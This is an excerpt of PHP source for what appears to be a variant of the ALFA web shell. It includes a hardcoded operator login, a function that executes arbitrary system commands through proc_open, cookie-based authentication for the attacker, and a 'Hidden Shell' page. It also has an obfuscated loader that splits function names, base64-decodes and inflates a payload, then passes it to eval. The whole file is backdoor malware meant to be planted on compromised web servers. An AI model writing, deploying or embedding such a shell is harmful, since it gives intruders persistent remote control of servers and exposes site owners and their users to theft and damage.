...
$GLOBALS['oZgNypoPRU'] = array(
  'username' => 'bunnyman',
  'password' => '28a5323655d10745e75362a444e36d3b', //md5
  'safe_mode' => '1',
  'login_page' => 'bunny',
  'show_icons' => '1',
...
define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__ ? _kunc1r4h4s1aalf4() : '');
...
function BunnyGokz($alfaman)
{
  ...
  $preg = 'pr' . 'eg_' . 'mat' . 'ch';
  $regex = '2' . '>' . '&' . '1';
  if (!$preg('/' . $regex . '/i', $alfaman)) {
    $alfaman = $alfaman . ' ' . $regex;
  }
  ...
  if ($func_exist($proc)) {
    ...
    $process = $proc($alfaman, $descriptors, $pipes);
    if ($is_rsrc($process)) {
...
$config = array('y0hxn3us3r' => $GLOBALS['DB_NAME']['user'], 'y0hxn3p4ss' => $GLOBALS['DB_NAME']['pass'], 'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'], 'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
...
if ($config['AlfaProtectShell']) {
  ...
  if ($config['AlfaLoginPage'] == 'gui') {
    if (@$_COOKIE["y0hxn3us3r"] != $config['y0hxn3us3r'] && $_COOKIE["y0hxn3p4ss"] != md5($config['y0hxn3p4ss'])) {
      if (@$_POST["usrname"] == $config['y0hxn3us3r'] && @md5($_POST["password"]) == $config['y0hxn3p4ss']) {
        __alfa_set_cookie("y0hxn3us3r", $config['y0hxn3us3r']);
        __alfa_set_cookie("y0hxn3p4ss", @md5($config['y0hxn3p4ss']));
...
<tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
    ...
    if (@$_COOKIE["y0hxn3p4ss"] != @md5($config['y0hxn3p4ss'])) {
      if (@md5($_POST["password"]) == $config['y0hxn3p4ss']) {
        __alfa_set_cookie("y0hxn3us3r", $config['y0hxn3us3r']);
        __alfa_set_cookie("y0hxn3p4ss", @md5($config['y0hxn3p4ss']));
        @header('location: ' . $_SERVER["PHP_SELF"]);
      }
  ...
  } elseif ($config['AlfaLoginPage'] == 'bunny') {
    if (@$_COOKIE["y0hxn3p4ss"] != @md5($config['y0hxn3p4ss'])) {
      if (@md5($_POST["password"]) == $config['y0hxn3p4ss']) {
        __alfa_set_cookie("y0hxn3us3r", $config['y0hxn3us3r']);
        __alfa_set_cookie("y0hxn3p4ss", @md5($config['y0hxn3p4ss']));
...
<head>
    ...
    <link href="https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/bm.jpg" rel="shortcut icon" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/bm.jpg"/>
...
function _kunc1r4h4s1aalf4()
{
  $secret = @$_COOKIE["kunc1r4h4s1aalf4"];
  if (!isset($_COOKIE["kunc1r4h4s1aalf4"])) {
    $secret = uniqid(mt_rand(), true);
    __alfa_set_cookie("kunc1r4h4s1aalf4", $secret);
  }
  return $secret;
}
...
function UUnSF($Ixg) { $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te'; $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de'; $nelrts = 'st' . 'rl' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $Ixg = $gflate($b64($Ixg)); for ($i = 0; $i < $nelrts($Ixg); $i++) { $Ixg[$i] = $rhc($dro($Ixg[$i]) - 1); } return $Ixg; }/***#***/ @/*55555*/eval/***#***/(UUnSF(""));
if (isset($_GET["bic"])) {
  @error_reporting(E_ALL ^ E_NOTICE);
  echo '<html>';
  echo "<title>Hidden Shell</title>";
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?bic"><span style="color:#42ff59;">' . __ALFA_CODE_NAME__ . '</span><br><small>Version: <span class="hidden_shell_version">' . __ALFA_VERSION__ . '</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/bm.jpg" /></td>
</tr>
<tr>
...
function alfalogout()
{
  @setcookie("y0hxn3us3r", null, 2012);
  @setcookie("y0hxn3p4ss", null, 2012);
  unset($_COOKIE['y0hxn3us3r'], $_COOKIE['y0hxn3p4ss']);
  echo ("ok");
}
